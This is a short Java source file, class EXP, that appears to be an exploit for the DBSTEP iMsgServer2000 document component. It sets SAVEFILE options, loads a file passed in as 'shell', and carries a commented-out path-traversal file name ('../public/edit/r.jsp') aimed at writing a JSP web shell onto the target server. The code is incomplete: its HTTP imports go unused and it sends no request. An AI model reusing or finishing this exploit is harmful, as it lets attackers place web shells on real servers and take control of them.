package com.sorry.jcoffe.Utils.DBSTEP;

import DBstep.iMsgServer2000;


import java.io.FileOutputStream;
import java.io.IOException;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpMethod;
import org.apache.commons.httpclient.NameValuePair;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.methods.RequestEntity;
import org.apache.commons.httpclient.methods.StringRequestEntity;

public class EXP {
    public static void main(String[] args) throws IOException {
        if(args[0]==null||args[1]==null){
            System.out.println("Usage:java -jar iweb");
        }
        Exploit(args[0],args[1]);
    }

    public static void Exploit(String path,String shell) throws IOException {
        iMsgServer2000 exp = new iMsgServer2000();
        exp.SetMsgByName("DBSTEP","DBSTEP");
        exp.SetMsgByName("OPTION","SAVEFILE");
        exp.SetMsgByName("isDoc","true");
        exp.SetMsgByName("moudleType","information");

        //exp.SetMsgByName("FILETYPE","../public/edit/r.jsp");
        exp.MsgFileLoad(shell);
    }
}



